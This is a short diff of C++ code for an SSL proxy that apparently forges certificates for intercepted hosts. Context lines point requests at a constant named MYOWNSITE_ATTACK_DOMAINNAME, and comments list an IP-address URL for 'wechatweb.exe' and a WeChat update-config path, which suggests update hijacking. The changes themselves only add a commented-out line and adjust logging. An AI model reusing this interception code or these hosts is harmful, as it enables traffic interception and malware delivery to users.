@@ -267,6 +267,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 			else if (iRet == 0) {
 				//lstrcpyA(pstSSLProxyParam->host, gstrServerIP.c_str());
 				lstrcpyA(spp->host, MYOWNSITE_ATTACK_DOMAINNAME);
+				//lstrcpyA(spp->host, "MyDummyCert");
 				
 				//https://47.101.189.13/test20190402/wechatweb.exe
 				//https://47.101.189.13:443/weixin/android/wxweb/updateConfig.xml
@@ -280,7 +281,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 		}
 	}
 	else {
-		printf("[%s %d] MSG_PEEK size error:%u\r\n", __FUNCTION__, __LINE__, WSAGetLastError());
+		log("[%s %d] MSG_PEEK size:%d error:%u\r\n", __FUNCTION__, __LINE__,peeklen, WSAGetLastError());
 		return -1;
 	}
 
@@ -296,7 +297,7 @@ int SSLProxy::SSL_ProxyClient(LPSSLPROXYPARAM spp) {
 	//int lockret = Lock::enterlock(gcertlock, id);
 
 	iRet = MakeCert::MakesureCertExist(spp->host);
-
+	
 	//lockret = Lock::leavelock(gcertlock, id);
 
 	if (iRet == FALSE)
